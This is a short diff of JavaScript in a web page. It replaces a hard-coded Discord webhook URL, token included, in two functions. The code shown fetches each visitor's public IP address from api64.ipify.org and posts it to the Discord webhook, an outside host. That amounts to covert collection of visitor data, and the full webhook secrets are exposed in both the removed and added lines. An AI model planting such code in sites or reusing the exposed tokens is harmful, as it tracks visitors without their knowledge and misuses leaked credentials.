@@ -120,7 +120,7 @@
 
     // Function to fetch visitor's IP address and send it via webhook
     function fetchIPAndSend() {
-        const webhookURL = 'https://discord.com/api/webhooks/1258378506488774658/X0GaQdemIG6rkhRpHRpUfDrwoVgUSAWWDfiXW9e01Mc06InUFYM7MnA-CuhsV6JDwnSI'; // Replace with your actual webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1259882864749576293/tvWmwsn3bcvO4JHqVqMeaS38NSuuuZ7nxaaNJ2lkv_ngHKZMXcCGAfII8MDyPR8Hx58S'; // Replace with your actual webhook URL
 
         fetch('https://api64.ipify.org?format=json')
             .then(response => response.json())
@@ -132,7 +132,7 @@
     }
 
     function sendToWebhook(ip) {
-        const webhookURL = 'https://discord.com/api/webhooks/1258378506488774658/X0GaQdemIG6rkhRpHRpUfDrwoVgUSAWWDfiXW9e01Mc06InUFYM7MnA-CuhsV6JDwnSI'; // Replace with your actual webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1259882864749576293/tvWmwsn3bcvO4JHqVqMeaS38NSuuuZ7nxaaNJ2lkv_ngHKZMXcCGAfII8MDyPR8Hx58S'; // Replace with your actual webhook URL
 
         const message = {
             content: `Visitor IP: ${ip}`
